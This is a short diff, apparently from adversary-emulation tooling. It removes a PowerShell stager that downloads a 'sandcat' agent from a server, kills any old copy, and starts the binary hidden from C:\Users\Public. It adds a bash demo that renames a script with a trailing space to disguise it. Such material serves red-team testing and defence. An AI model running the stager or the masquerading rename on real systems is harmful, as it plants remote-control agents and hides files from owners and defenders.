@@ -1,1 +1,8 @@
-$server="http://10.99.156.80:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\agentb.exe"} | stop-process -f;rm -force "C:\Users\Public\agentb.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\agentb.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\agentb.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+echo -e '#!/bin/bash\necho "print(\"hello, world!\")" | /usr/bin/python\nexit' > execute.sh
+chmod +x execute.sh
+./execute.sh
+
+mv execute.sh "execute.sh "
+"./execute.sh "
+
+echo $?
